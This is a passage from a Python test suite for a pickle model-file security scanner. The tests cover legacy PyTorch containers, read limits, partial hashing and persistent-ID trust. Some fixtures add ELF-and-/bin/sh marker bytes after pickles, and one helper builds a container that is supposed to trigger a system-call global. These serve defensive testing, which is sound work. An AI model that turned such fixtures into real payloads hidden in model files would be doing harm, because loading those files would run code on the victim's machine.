    pickle_payload = pickle.dumps({"safe": True}, protocol=4)
    payload = pickle_payload + b"\x7fELF/bin/sh\x00"
    stream = io.BytesIO(prefix + payload)
    stream.seek(len(prefix))

    result = PickleScanner().scan_stream(stream, len(payload), source="embedded-tail.bin")

    expected_offset = len(prefix) + len(pickle_payload)
    assert any(issue.rule_code == "S502" and issue.details.get("offset") == expected_offset for issue in result.issues)


def test_extract_metadata_uses_pickle_opcodes_not_raw_bytes(tmp_path: Path) -> None:
    path = tmp_path / "safe.pkl"
    path.write_bytes(pickle.dumps({"letter": "R", "word": "build"}, protocol=4))

    metadata = PickleScanner().extract_metadata(str(path))

    assert metadata["has_dangerous_opcodes"] is False
    assert metadata["dangerous_opcodes"] == []
    assert metadata["total_opcodes"] > 0


@pytest.mark.parametrize(
    ("configured_limit", "expected_error"),
    [
        (0, "max_metadata_pickle_read_size must be greater than 0"),
        (-1, "max_metadata_pickle_read_size must be greater than 0"),
        ("invalid", "max_metadata_pickle_read_size must be greater than 0"),
        (10 * 1024 * 1024 + 1, "max_metadata_pickle_read_size too large (max: 10485760)"),
    ],
)
def test_extract_metadata_validates_pickle_read_limit(
    tmp_path: Path,
    configured_limit: object,
    expected_error: str,
) -> None:
    path = tmp_path / "safe.pkl"
    path.write_bytes(pickle.dumps({"safe": True}, protocol=4))

    metadata = PickleScanner(config={"max_metadata_pickle_read_size": configured_limit}).extract_metadata(str(path))

    assert metadata["extraction_error"] == expected_error


def test_legacy_pytorch_container_does_not_report_known_stream_truncated(tmp_path: Path) -> None:
    payload, pickle_end = _make_legacy_pytorch_container(b"A" * 512)
    path = tmp_path / "legacy-known-size.bin"
    path.write_bytes(payload)

    result = PickleScanner(
        config={
            "max_known_stream_read_bytes": 256,
            "pickle_root_raw_scan_limit_bytes": len(payload),
        }
    ).scan(str(path))

    assert result.success is True
    assert "known_stream_truncated" not in result.metadata.get("scan_outcome_reasons", [])
    assert not any(check.details.get("notice_code") == "known_stream_truncated" for check in result.checks)
    assert result.metadata["legacy_pytorch_storage_start"] == pickle_end


def test_large_legacy_pytorch_container_defers_file_size_limit(tmp_path: Path) -> None:
    payload, pickle_end = _make_legacy_pytorch_container(b"A" * 512)
    path = tmp_path / "legacy-large.bin"
    path.write_bytes(payload)

    result = PickleScanner(config={"max_file_read_size": 256}).scan(str(path))

    assert result.success is False
    assert result.metadata["legacy_pytorch_container"] is True
    assert result.metadata["legacy_pytorch_storage_start"] == pickle_end
    assert result.metadata["legacy_pytorch_storage_payload_skipped"] is True
    assert result.metadata["legacy_pytorch_bounded_analysis"] is True
    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert "legacy_pytorch_storage_payload_skipped" in result.metadata["scan_outcome_reasons"]
    assert "max_file_read_size_exceeded" not in result.metadata.get("scan_outcome_reasons", [])
    bounded_check = next(check for check in result.checks if check.name == "Legacy PyTorch Bounded Analysis")
    coverage_check = next(check for check in result.checks if check.name == "Legacy PyTorch Storage Payload Coverage")
    assert bounded_check.status == CheckStatus.PASSED
    assert coverage_check.status == CheckStatus.FAILED
    assert bounded_check.details["max_file_read_size"] == 256
    assert bounded_check.details["tensor_storage_materialized"] is False


def test_large_legacy_pytorch_malicious_control_still_fails(tmp_path: Path) -> None:
    payload, _pickle_end = _make_legacy_pytorch_container(
        b"A" * 512,
        malicious_object=True,
    )
    path = tmp_path / "legacy-large-malicious.pt"
    path.write_bytes(payload)

    result = PickleScanner(config={"max_file_read_size": 256}).scan(str(path))

    assert result.success is False
    assert result.metadata["legacy_pytorch_bounded_analysis"] is True
    assert "legacy_pytorch_storage_payload_skipped" in result.metadata["scan_outcome_reasons"]
    assert "max_file_read_size_exceeded" not in result.metadata.get("scan_outcome_reasons", [])
    assert any(issue.severity == IssueSeverity.CRITICAL for issue in result.issues)
    assert any(issue.details.get("import_reference") == EXPECTED_SYSTEM_GLOBAL for issue in result.issues)


def test_regular_scan_defers_oversized_raw_legacy_pytorch_content_hash(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    from modelaudit import core

    payload, _pickle_end = _make_legacy_pytorch_container(b"A" * 512)
    path = tmp_path / "legacy-large.pt"
    path.write_bytes(payload)

    def fail_hash(candidate: str) -> str:
        if candidate == str(path):
            pytest.fail("oversized raw legacy PyTorch file was hashed before bounded scan dispatch")
        return "a" * 64

    monkeypatch.setattr(core, "_calculate_file_hash", fail_hash)

    result = scan_model_directory_or_file(
        str(path),
        max_file_size=10_000,
        max_file_read_size=256,
        cache_enabled=False,
    )

    metadata = result.file_metadata[str(path)].model_dump(mode="python")

    assert result.success is False
    assert result.content_hash is None
    assert metadata["file_hashes"]["sha256"] is None
    assert isinstance(metadata["file_hashes"]["sha256_prefix"], str)
    assert metadata["legacy_pytorch_bounded_analysis"] is True
    assert metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert "legacy_pytorch_storage_payload_skipped" in metadata["scan_outcome_reasons"]
    assert determine_exit_code(result) == 2


def test_large_non_legacy_pytorch_suffix_keeps_file_size_limit(tmp_path: Path) -> None:
    path = tmp_path / "not-legacy.pt"
    path.write_bytes(b"not legacy" + (b"A" * 512) + b"\x7fELF/bin/sh\x00")

    result = PickleScanner(
        config={
            "max_file_read_size": 64,
            "pickle_root_raw_scan_limit_bytes": 4096,
        }
    ).scan(str(path))

    assert result.success is False
    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert "max_file_read_size_exceeded" in result.metadata["scan_outcome_reasons"]
    assert not result.metadata.get("legacy_pytorch_bounded_analysis")
    assert any(check.name == "File Size Limit" and check.status == CheckStatus.FAILED for check in result.checks)
    assert not any(issue.rule_code == "S502" for issue in result.issues)


def test_small_non_legacy_pickle_with_legacy_magic_bytes_is_not_inconclusive(tmp_path: Path) -> None:
    path = tmp_path / "magic-literal.pt"
    path.write_bytes(pickle.dumps({"magic": pickle_scanner._PYTORCH_LEGACY_MAGIC_BINARY}, protocol=4))

    result = PickleScanner().scan(str(path))

    assert result.success is True
    assert result.metadata.get("legacy_pytorch_container") is not True
    assert "legacy_pytorch_control_layout_incomplete" not in result.metadata.get("scan_outcome_reasons", [])


def test_large_pytorch_suffix_with_only_legacy_preamble_keeps_file_size_limit(tmp_path: Path) -> None:
    partial_legacy = pickle.dumps(pickle_scanner._PYTORCH_LEGACY_MAGIC_NUMBER, protocol=2) + pickle.dumps(
        pickle_scanner._PYTORCH_LEGACY_PROTOCOL_VERSION,
        protocol=2,
    )
    path = tmp_path / "legacy-preamble-only.pt"
    path.write_bytes(partial_legacy + (b"A" * 512))

    result = PickleScanner(config={"max_file_read_size": 64}).scan(str(path))

    assert result.success is False
    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert "max_file_read_size_exceeded" in result.metadata["scan_outcome_reasons"]
    assert "legacy_pytorch_control_layout_incomplete" not in result.metadata.get("scan_outcome_reasons", [])


def test_large_non_seekable_non_legacy_suffix_reads_only_preamble_before_cap() -> None:
    payload = pickle.dumps({"safe": True}, protocol=4) + (b"A" * 4096)
    stream = CountingNonSeekableBytesIO(payload)

    result = PickleScanner(
        config={
            "max_file_read_size": 256,
            "max_known_stream_read_bytes": len(payload),
        }
    ).scan_stream(stream, len(payload), source="not-legacy.bin")

    assert result.success is False
    assert "max_file_read_size_exceeded" in result.metadata["scan_outcome_reasons"]
    assert stream.bytes_read <= pickle_scanner._PYTORCH_LEGACY_PREAMBLE_PROBE_BYTES
    assert not result.metadata.get("legacy_pytorch_bounded_analysis")


def test_large_weak_legacy_preamble_suffix_keeps_file_size_limit(tmp_path: Path) -> None:
    payload = pickle.dumps(0x1950A86A20F9469CFC6C, protocol=2)
    payload += pickle.dumps(1001, protocol=2)
    payload += b"not-complete-legacy-layout"
    payload += b"A" * 512
    path = tmp_path / "weak-legacy-preamble.pt"
    path.write_bytes(payload)

    result = PickleScanner(config={"max_file_read_size": 256}).scan(str(path))

    assert result.success is False
    assert "max_file_read_size_exceeded" in result.metadata["scan_outcome_reasons"]
    assert "legacy_pytorch_control_layout_incomplete" not in result.metadata.get("scan_outcome_reasons", [])
    assert not result.metadata.get("legacy_pytorch_bounded_analysis")


def test_large_legacy_pytorch_truncated_storage_is_inconclusive_not_file_size(
    tmp_path: Path,
) -> None:
    payload, _pickle_end = _make_legacy_pytorch_container(
        b"A" * 128,
        declared_storage_size=512,
    )
    path = tmp_path / "legacy-truncated-storage.bin"
    path.write_bytes(payload)

    result = PickleScanner(config={"max_file_read_size": 256}).scan(str(path))

    assert result.success is False
    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert "legacy_pytorch_storage_layout_incomplete" in result.metadata["scan_outcome_reasons"]
    assert "max_file_read_size_exceeded" not in result.metadata.get("scan_outcome_reasons", [])
    storage_check = next(check for check in result.checks if check.name == "Legacy PyTorch Storage Layout")
    assert storage_check.status == CheckStatus.FAILED
    assert storage_check.details["control_scan_limit_bytes"] == pickle_scanner._PYTORCH_LEGACY_MAX_CONTROL_BYTES
    assert storage_check.details["max_control_opcodes"] == pickle_scanner._PYTORCH_LEGACY_MAX_CONTROL_OPCODES


def test_regular_scan_defers_hash_for_incomplete_legacy_pytorch_layout(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    from modelaudit import core

    payload, _pickle_end = _make_legacy_pytorch_container(
        b"A" * 128,
        declared_storage_size=512,
    )
    path = tmp_path / "legacy-truncated-storage.pt"
    path.write_bytes(payload)

    def fail_hash(candidate: str) -> str:
        if candidate == str(path):
            pytest.fail("incomplete legacy PyTorch layout was hashed before bounded scan dispatch")
        return "a" * 64

    monkeypatch.setattr(core, "_calculate_file_hash", fail_hash)

    result = scan_model_directory_or_file(
        str(path),
        max_file_size=10_000,
        max_file_read_size=256,
        cache_enabled=False,
    )
    metadata = result.file_metadata[str(path)].model_dump(mode="python")

    assert result.content_hash is None
    assert metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert "legacy_pytorch_storage_layout_incomplete" in metadata["scan_outcome_reasons"]
    assert metadata["file_hashes"]["sha256"] is None
    assert isinstance(metadata["file_hashes"]["sha256_prefix"], str)


def test_large_seekable_legacy_pytorch_stream_defers_file_size_limit() -> None:
    payload, pickle_end = _make_legacy_pytorch_container(b"A" * 512)
    stream = io.BytesIO(payload)

    result = PickleScanner(config={"max_file_read_size": 256}).scan_stream(
        stream,
        len(payload),
        source="legacy-large-stream.pt",
    )

    assert result.success is False
    assert result.metadata["legacy_pytorch_container"] is True
    assert result.metadata["legacy_pytorch_storage_start"] == pickle_end
    assert result.metadata["legacy_pytorch_bounded_analysis"] is True
    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert "legacy_pytorch_storage_payload_skipped" in result.metadata["scan_outcome_reasons"]
    assert "max_file_read_size_exceeded" not in result.metadata.get("scan_outcome_reasons", [])
    assert stream.tell() == 0
    integrity_check = next(check for check in result.checks if check.name == "File Integrity Check")
    assert integrity_check.details["hash_complete"] is False
    assert "sha256_prefix" in integrity_check.details
    assert "sha256" not in integrity_check.details
    assert "sha256_prefix" in result.metadata["file_hashes"]
    assert "sha256" not in result.metadata["file_hashes"]


def test_large_seekable_legacy_stream_partial_hash_uses_prefix_metadata() -> None:
    payload_a, pickle_end = _make_legacy_pytorch_container(b"A" * 512)
    payload_b, _other_pickle_end = _make_legacy_pytorch_container(b"B" * 512)
    results = [
        PickleScanner(config={"max_file_read_size": 256}).scan_stream(
            io.BytesIO(payload),
            len(payload),
            source=f"legacy-shard-{index}.pt",
        )
        for index, payload in enumerate((payload_a, payload_b), start=1)
    ]

    assert hashlib.sha256(payload_a).hexdigest() != hashlib.sha256(payload_b).hexdigest()
    assert results[0].metadata["file_hashes"] == results[1].metadata["file_hashes"]
    for result in results:
        file_hashes = result.metadata["file_hashes"]
        assert "sha256" not in file_hashes
        assert file_hashes["sha256_prefix"] == hashlib.sha256(payload_a[:pickle_end]).hexdigest()
        integrity_check = next(check for check in result.checks if check.name == "File Integrity Check")
        assert integrity_check.details["hash_complete"] is False
        assert "sha256" not in integrity_check.details
        assert integrity_check.details["sha256_prefix"] == file_hashes["sha256_prefix"]

    results[0].metadata["file_path"] = "legacy-shard-1.pt"
    aggregate_result = create_initial_audit_result()
    merge_scan_result(aggregate_result, results[0])
    aggregate_metadata = aggregate_result.file_metadata["legacy-shard-1.pt"].model_dump(
        mode="json",
        exclude_none=True,
    )
    assert aggregate_metadata["file_hashes"] == results[0].metadata["file_hashes"]


def test_large_non_seekable_legacy_pytorch_stream_uses_stream_budget_not_file_cap() -> None:
    payload, pickle_end = _make_legacy_pytorch_container(b"A" * 512)

    result = PickleScanner(
        config={
            "max_file_read_size": pickle_end,
            "max_known_stream_read_bytes": len(payload),
        }
    ).scan_stream(
        NonSeekableBytesIO(payload),
        len(payload),
        source="legacy-large-nonseekable.pt",
    )

    assert result.success is False
    assert result.metadata["legacy_pytorch_container"] is True
    assert result.metadata["legacy_pytorch_storage_start"] == pickle_end
    assert result.metadata["pickle_stream_bytes_buffered"] == len(payload)
    assert result.metadata["pickle_stream_bytes_buffered"] > pickle_end
    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert "legacy_pytorch_storage_payload_skipped" in result.metadata["scan_outcome_reasons"]
    assert "max_file_read_size_exceeded" not in result.metadata.get("scan_outcome_reasons", [])


def test_large_non_seekable_legacy_preamble_without_layout_keeps_file_size_limit() -> None:
    partial_legacy = pickle.dumps(pickle_scanner._PYTORCH_LEGACY_MAGIC_NUMBER, protocol=2) + pickle.dumps(
        pickle_scanner._PYTORCH_LEGACY_PROTOCOL_VERSION,
        protocol=2,
    )
    payload = partial_legacy + (b"A" * 4096)
    stream = NonSeekableBytesIO(payload)

    result = PickleScanner(
        config={
            "max_file_read_size": 64,
            "max_known_stream_read_bytes": len(payload),
        }
    ).scan_stream(
        stream,
        len(payload),
        source="legacy-preamble-only.pt",
    )

    assert result.success is False
    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert "max_file_read_size_exceeded" in result.metadata["scan_outcome_reasons"]
    assert "legacy_pytorch_control_layout_incomplete" not in result.metadata.get("scan_outcome_reasons", [])
    assert any(check.name == "File Size Limit" and check.rule_code == "S904" for check in result.checks)
    assert stream.tell() == min(len(payload), pickle_scanner._PYTORCH_LEGACY_PREAMBLE_PROBE_BYTES)


def test_large_non_seekable_truncated_legacy_control_keeps_file_size_limit() -> None:
    partial_legacy = pickle.dumps(pickle_scanner._PYTORCH_LEGACY_MAGIC_NUMBER, protocol=2) + pickle.dumps(
        pickle_scanner._PYTORCH_LEGACY_PROTOCOL_VERSION,
        protocol=2,
    )
    payload = partial_legacy + b"\x80\x02X" + (4096).to_bytes(4, "little") + (b"A" * 4096)
    stream = NonSeekableBytesIO(payload)

    assert pickle_scanner._legacy_pytorch_control_probe_needs_more_bytes(
        payload[: pickle_scanner._PYTORCH_LEGACY_PREAMBLE_PROBE_BYTES]
    )

    result = PickleScanner(
        config={
            "max_file_read_size": 64,
            "max_known_stream_read_bytes": len(payload),
        }
    ).scan_stream(
        stream,
        len(payload),
        source="legacy-truncated-control.pt",
    )

    assert result.success is False
    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert "max_file_read_size_exceeded" in result.metadata["scan_outcome_reasons"]
    assert "legacy_pytorch_control_layout_incomplete" not in result.metadata.get("scan_outcome_reasons", [])
    assert any(check.name == "File Size Limit" and check.rule_code == "S904" for check in result.checks)
    assert stream.tell() == min(len(payload), pickle_scanner._PYTORCH_LEGACY_PREAMBLE_PROBE_BYTES)


def test_large_non_seekable_legacy_pytorch_stream_budget_exhaustion_is_inconclusive() -> None:
    payload, pickle_end = _make_legacy_pytorch_container(b"A" * 512)

    result = PickleScanner(
        config={
            "max_file_read_size": pickle_end,
            "max_known_stream_read_bytes": pickle_end,
        }
    ).scan_stream(
        NonSeekableBytesIO(payload),
        len(payload),
        source="legacy-large-budget.pt",
    )

    assert result.success is False
    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert "legacy_pytorch_storage_layout_incomplete" in result.metadata["scan_outcome_reasons"]
    assert "max_file_read_size_exceeded" not in result.metadata.get("scan_outcome_reasons", [])
    storage_check = next(check for check in result.checks if check.name == "Legacy PyTorch Storage Layout")
    assert storage_check.status == CheckStatus.FAILED
    assert storage_check.details["max_control_opcodes"] == pickle_scanner._PYTORCH_LEGACY_MAX_CONTROL_OPCODES


def test_large_non_seekable_legacy_pytorch_short_read_is_inconclusive() -> None:
    payload, pickle_end = _make_legacy_pytorch_container(b"A" * 512)
    truncated_payload = payload[: pickle_end + 8]

    result = PickleScanner(
        config={
            "max_file_read_size": pickle_end,
            "max_known_stream_read_bytes": len(payload),
        }
    ).scan_stream(
        NonSeekableBytesIO(truncated_payload),
        len(payload),
        source="legacy-large-short-read.pt",
    )

    assert result.success is False
    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert "non_seekable_stream_short_read" in result.metadata["scan_outcome_reasons"]
    assert result.metadata["pickle_stream_declared_size"] == len(payload)
    assert result.metadata["pickle_stream_bytes_buffered"] == len(truncated_payload)
    assert result.metadata["pickle_stream_root_scan_requested_bytes"] == len(payload)
    assert "legacy_pytorch_storage_start" not in result.metadata
    assert not result.metadata.get("legacy_pytorch_bounded_analysis")
    short_read_check = next(check for check in result.checks if check.name == "Pickle Stream Read")
    assert short_read_check.status == CheckStatus.FAILED
    assert short_read_check.details["bytes_requested"] == len(payload)


def test_large_non_seekable_legacy_pytorch_short_read_fails_closed() -> None:
    payload, pickle_end = _make_legacy_pytorch_container(
        b"A" * 128,
        declared_storage_size=512,
    )
    declared_size = len(payload) + (512 - 128)

    result = PickleScanner(
        config={
            "max_file_read_size": pickle_end,
            "max_known_stream_read_bytes": declared_size,
        }
    ).scan_stream(
        NonSeekableBytesIO(payload),
        declared_size,
        source="legacy-truncated-nonseekable.pt",
    )

    assert result.success is False
    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert "non_seekable_stream_short_read" in result.metadata["scan_outcome_reasons"]
    assert result.metadata["pickle_stream_declared_size"] == declared_size
    assert result.metadata["pickle_stream_bytes_buffered"] == len(payload)
    assert not result.metadata.get("legacy_pytorch_bounded_analysis")
    short_read_check = next(check for check in result.checks if check.name == "Pickle Stream Read")
    assert short_read_check.status == CheckStatus.FAILED
    assert short_read_check.details["bytes_requested"] == declared_size


@pytest.mark.skipif(os.name == "nt", reason="sparse file hole allocation is platform dependent")
def test_sparse_multigib_legacy_pytorch_file_uses_prefix_hash(tmp_path: Path) -> None:
    sparse_storage_size = 2 * 1024 * 1024 * 1024
    payload, pickle_end = _make_legacy_pytorch_container(
        b"",
        declared_storage_size=sparse_storage_size,
    )
    path = tmp_path / "legacy-sparse-large.bin"
    path.write_bytes(payload)
    file_size = pickle_end + 8 + sparse_storage_size
    with path.open("r+b") as handle:
        handle.truncate(file_size)

    result = PickleScanner(config={"pickle_root_raw_scan_limit_bytes": 4096}).scan(str(path))

    assert result.success is False
    assert result.metadata["legacy_pytorch_container"] is True
    assert result.metadata["legacy_pytorch_storage_payload_skipped"] is True
    assert result.metadata["legacy_pytorch_storage_end"] == file_size
    assert result.metadata["legacy_pytorch_bounded_analysis_file_size"] == file_size
    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert "legacy_pytorch_storage_payload_skipped" in result.metadata["scan_outcome_reasons"]
    integrity_check = next(check for check in result.checks if check.name == "File Integrity Check")
    assert integrity_check.details["hash_complete"] is False
    assert integrity_check.details["bytes_hashed"] == 4096
    assert integrity_check.details["file_size"] == file_size
    assert "sha256_prefix" in integrity_check.details
    assert "max_file_read_size_exceeded" not in result.metadata.get("scan_outcome_reasons", [])


@pytest.mark.skipif(os.name == "nt", reason="sparse file hole allocation is platform dependent")
def test_sparse_legacy_pytorch_multi_storage_header_beyond_control_probe(tmp_path: Path) -> None:
    storage_size = pickle_scanner._PYTORCH_LEGACY_MAX_CONTROL_BYTES + 4096
    payload, pickle_end = _make_legacy_pytorch_container(
        b"",
        declared_storage_size=storage_size,
        storage_keys=("0", "1"),
    )
    path = tmp_path / "legacy-multi-storage-large.pt"
    first_header = storage_size.to_bytes(8, "little")
    path.write_bytes(payload[:pickle_end] + first_header)
    second_header_offset = pickle_end + len(first_header) + storage_size
    file_size = second_header_offset + len(first_header) + storage_size
    with path.open("r+b") as handle:
        handle.seek(second_header_offset)
        handle.write(first_header)
        handle.truncate(file_size)

    result = PickleScanner(
        config={
            "max_file_read_size": 256,
            "pickle_root_raw_scan_limit_bytes": 4096,
        }
    ).scan(str(path))

    assert result.success is False
    assert result.metadata["legacy_pytorch_container"] is True
    assert result.metadata["legacy_pytorch_storage_key_count"] == 2
    assert result.metadata["legacy_pytorch_storage_end"] == file_size
    assert result.metadata["legacy_pytorch_bounded_analysis_file_size"] == file_size
    assert result.metadata["legacy_pytorch_bounded_analysis"] is True
    assert "legacy_pytorch_storage_payload_skipped" in result.metadata["scan_outcome_reasons"]
    assert "legacy_pytorch_storage_layout_incomplete" not in result.metadata.get("scan_outcome_reasons", [])


def test_legacy_pytorch_container_accepts_historical_big_endian_storage_header(tmp_path: Path) -> None:
    storage_payload = b"A" * 64
    payload, pickle_end = _make_legacy_pytorch_container(storage_payload)
    big_endian_payload = payload[:pickle_end] + len(storage_payload).to_bytes(8, "big") + storage_payload
    path = tmp_path / "legacy-big-endian-header.pt"
    path.write_bytes(big_endian_payload)

    result = PickleScanner().scan(str(path))

    assert result.success is True
    assert result.metadata["legacy_pytorch_container"] is True
    assert result.metadata["legacy_pytorch_storage_end"] == len(big_endian_payload)


def test_legacy_pytorch_container_trusts_canonical_storage_binpersid(tmp_path: Path) -> None:
    payload, pickle_end = _make_legacy_pytorch_container(b"A" * 64)
    path = tmp_path / "legacy-storage.pt"
    path.write_bytes(payload)

    result = PickleScanner().scan(str(path))

    trusted_checks = _trusted_legacy_storage_pid_checks(result)
    assert result.success is True
    assert result.metadata["legacy_pytorch_container"] is True
    assert result.metadata["legacy_pytorch_storage_start"] == pickle_end
    assert result.metadata["legacy_pytorch_storage_end"] == len(payload)
    assert result.metadata["legacy_pytorch_trusted_storage_persistent_id_count"] == 1
    assert not _persistent_id_issues(result)
    assert len(trusted_checks) == 1
    assert trusted_checks[0].status == CheckStatus.PASSED
    assert trusted_checks[0].severity == IssueSeverity.INFO
    assert trusted_checks[0].rule_code == "S212"
    assert trusted_checks[0].details["opcode"] == "BINPERSID"
    assert trusted_checks[0].details["pytorch_storage_key"] == "0"


def test_legacy_pytorch_bin_extension_uses_framing_not_suffix_for_storage_trust(tmp_path: Path) -> None:
    payload, _pickle_end = _make_legacy_pytorch_container(b"A" * 64)
    path = tmp_path / "pytorch_model.bin"
    path.write_bytes(payload)

    result = PickleScanner().scan(str(path))

    assert result.success is True
    assert result.metadata["legacy_pytorch_container"] is True
    assert not _persistent_id_issues(result)
    assert len(_trusted_legacy_storage_pid_checks(result)) == 1


def test_bin_extension_alone_does_not_trust_pytorch_storage_binpersid(tmp_path: Path) -> None:
    path = tmp_path / "pytorch_model.bin"
    path.write_bytes(_legacy_pytorch_object_stream(("0",), 1))

    result = PickleScanner().scan(str(path))

    issues = _persistent_id_issues(result, opcode="BINPERSID")
    assert result.metadata.get("legacy_pytorch_container") is not True
    assert not _trusted_legacy_storage_pid_checks(result)
    assert len(issues) == 1
    assert issues[0].rule_code == "S212"
    assert issues[0].details["pytorch_storage_key"] == "0"


def test_legacy_pytorch_rejects_custom_persid_without_trusting_storage_pid(tmp_path: Path) -> None:
    canonical_pid = _legacy_pytorch_storage_pid_tuple("0", 64)
    object_stream = b"\x80\x02]Pexternal://weights\n" + b"a" + canonical_pid + b"Qa."
    payload, _pickle_end = _make_legacy_pytorch_container_with_object_stream(b"A" * 64, object_stream)
    path = tmp_path / "legacy-custom-persid.pt"
    path.write_bytes(payload)

    result = PickleScanner().scan(str(path))

    _assert_legacy_storage_layout_incomplete(result)
    issues = _persistent_id_issues(result, opcode="PERSID")
    assert len(issues) == 1
    assert issues[0].rule_code == "S212"
    assert issues[0].details["opcode"] == "PERSID"


def test_legacy_pytorch_rejects_extra_binpersid_without_trusting_first_storage_pid(tmp_path: Path) -> None:
    canonical_pid = _legacy_pytorch_storage_pid_tuple("0", 64)
    object_stream = b"\x80\x02]" + canonical_pid + b"Qa" + _binunicode(b"external://weights") + b"Qa."
    payload, _pickle_end = _make_legacy_pytorch_container_with_object_stream(b"A" * 64, object_stream)
    path = tmp_path / "legacy-extra-binpersid.pt"
    path.write_bytes(payload)

    result = PickleScanner().scan(str(path))

    _assert_legacy_storage_layout_incomplete(result)
    issues = _persistent_id_issues(result, opcode="BINPERSID")
    assert len(issues) == 1
    assert issues[0].rule_code == "S212"
    assert issues[0].details["pytorch_storage_key"] == "0"
    assert any(
        check.details.get("pickle_notice_code") == "persistent_id_summary"
        and check.details.get("persistent_id_count") == 2
        for check in result.checks
    )


@pytest.mark.parametrize(
    "pid_tuple",
    [
        _legacy_pytorch_storage_pid_tuple("0", 64, view_metadata=b""),
        _legacy_pytorch_storage_pid_tuple("0", 64, element_count=b"\x88"),
        _legacy_pytorch_storage_pid_tuple("0", 64, extra_fields=_binunicode(b"unexpected")),
        _legacy_pytorch_storage_pid_tuple("0", 64, storage_type=_binunicode(b"torch.ByteStorage")),
    ],
    ids=["five-field", "bool-size", "extra-field", "string-storage-type"],
)
def test_legacy_pytorch_rejects_noncanonical_storage_pid_tuple(
    tmp_path: Path,
    pid_tuple: bytes,
) -> None:
    object_stream = _legacy_pytorch_object_stream_from_pid(pid_tuple)
    payload, _pickle_end = _make_legacy_pytorch_container_with_object_stream(b"A" * 64, object_stream)
    path = tmp_path / "legacy-noncanonical-storage.pt"
    path.write_bytes(payload)

    result = PickleScanner().scan(str(path))

    _assert_legacy_storage_layout_incomplete(result)
    assert _persistent_id_issues(result, opcode="BINPERSID")


def test_legacy_pytorch_rejects_missing_storage_key_record_without_trusting_partial_pid(
    tmp_path: Path,
) -> None:
    object_stream = _legacy_pytorch_object_stream(("0",), 64)
    payload, _pickle_end = _make_legacy_pytorch_container_with_object_stream(
        b"A" * 64,
        object_stream,
        storage_keys=("0", "1"),
    )
    path = tmp_path / "legacy-missing-storage-key.pt"
    path.write_bytes(payload)

    result = PickleScanner().scan(str(path))

    _assert_legacy_storage_layout_incomplete(result)
    issues = _persistent_id_issues(result, opcode="BINPERSID")
    assert len(issues) == 1
    assert issues[0].details["pytorch_storage_key"] == "0"


def test_legacy_pytorch_rejects_unlisted_storage_key_record_without_trusting_pid(tmp_path: Path) -> None:
    object_stream = _legacy_pytorch_object_stream(("1",), 64)
    payload, _pickle_end = _make_legacy_pytorch_container_with_object_stream(
        b"A" * 64,
        object_stream,
        storage_keys=("0",),
    )
    path = tmp_path / "legacy-unlisted-storage-key.pt"
    path.write_bytes(payload)

    result = PickleScanner().scan(str(path))

    _assert_legacy_storage_layout_incomplete(result)
    issues = _persistent_id_issues(result, opcode="BINPERSID")
    assert len(issues) == 1
    assert issues[0].details["pytorch_storage_key"] == "1"


def test_legacy_pytorch_rejects_truncated_storage_payload_without_trusting_binpersid(
    tmp_path: Path,
) -> None:
    payload, _pickle_end = _make_legacy_pytorch_container(b"A" * 64)
    path = tmp_path / "legacy-truncated-storage.pt"
    path.write_bytes(payload[:-1])

    result = PickleScanner().scan(str(path))

    _assert_legacy_storage_layout_incomplete(result)
    issues = _persistent_id_issues(result, opcode="BINPERSID")
    assert len(issues) == 1
    assert issues[0].details["pytorch_storage_key"] == "0"


def test_legacy_pytorch_seekable_stream_uses_control_stream_boundary() -> None:
    payload, pickle_end = _make_legacy_pytorch_container(b"A" * 512)
    stream = io.BytesIO(payload)

    result = PickleScanner(
        config={
            "max_known_stream_read_bytes": 256,
            "pickle_root_raw_scan_limit_bytes": len(payload),
        }
    ).scan_stream(stream, len(payload), source="legacy-stream.bin")

    assert result.success is True
    assert "known_stream_truncated" not in result.metadata.get("scan_outcome_reasons", [])
    assert result.metadata["legacy_pytorch_storage_start"] == pickle_end
    assert stream.tell() == 0


def test_unknown_size_seekable_legacy_pytorch_stream_rejects_oversized_storage_span() -> None:
    payload, _pickle_end = _make_legacy_pytorch_container(
        b"",
        declared_storage_size=(1 << 63) - 1,
    )
    stream = io.BytesIO(payload)

    result = PickleScanner().scan_stream(stream, None, source="legacy-oversized-storage.pt")

    assert result.success is False
    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert "legacy_pytorch_storage_layout_incomplete" in result.metadata["scan_outcome_reasons"]
    assert any(check.name == "Legacy PyTorch Storage Layout" for check in result.checks)
    assert stream.tell() == 0


def test_legacy_pytorch_storage_is_not_treated_as_binary_tail(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    payload, pickle_end = _make_legacy_pytorch_container(b"A" * 64)
    path = tmp_path / "legacy-storage-tail.bin"
    path.write_bytes(payload)
    monkeypatch.setattr(pickle_scanner, "_BINARY_TAIL_SCAN_BYTES", 100)

    result = PickleScanner().scan(str(path))

    assert result.success is True
    assert not any(check.name == "Pickle Binary Tail Coverage" for check in result.checks)
    assert result.metadata["legacy_pytorch_storage_start"] == pickle_end


def test_storageless_legacy_pytorch_container_scans_appended_binary_tail(tmp_path: Path) -> None:
    payload, pickle_end = _make_legacy_pytorch_container(b"", storage_keys=())
    path = tmp_path / "storageless-legacy-tail.pt"
    path.write_bytes(payload + b"\x7fELF/bin/sh\x00")

    result = PickleScanner().scan(str(path))

